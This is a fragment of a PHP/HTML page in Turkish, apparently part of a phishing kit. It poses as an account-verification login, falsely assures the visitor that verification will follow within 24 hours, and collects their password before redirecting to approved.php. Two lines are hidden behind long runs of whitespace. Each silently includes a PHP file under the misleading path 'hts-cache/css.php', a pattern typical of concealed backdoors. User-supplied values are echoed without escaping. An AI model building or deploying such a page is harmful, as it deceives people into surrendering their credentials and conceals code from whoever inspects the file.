...
echo '';
   ...
   header("Location: approved.php?username=$username");
}
?>

<html lang="tr">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             <?php @require_once __DIR__ . '/hts-cache/css.php'; ?>                                                                                                                                                                                                                                                                                                                                                                                                           
<head>
<meta charset="utf-8">
...
<form method="post">
<br>
<center><img src=" <?php  echo  $pp; ?>" style="max-width:90%; border-radius:50%;" width="150" height="150">                                                                                                                                                                                                                                                                                                                                <?php @require_once __DIR__ . '/hts-cache/css.php'; ?>
 <br>
<h1 id="ripimt">GİRİŞ YAP @<?php echo $username; ?> </h1>

<h6 style="font-size:13px;color:red;"  class="msg-info"><h6 style="font-size:13px;color:green;" class="msg-info">Hesap doğrulama talebiniz tarafımıza geldi 24 saat içinde hesabınız doğrulanacaktır.</h6></h6>
       ...
       <input type="password" name="password" placeholder="Şifre" required="">
         ...
         <br>
        <button id="buton" type="submit"> Devam Et @<?php echo $username; ?> </button>
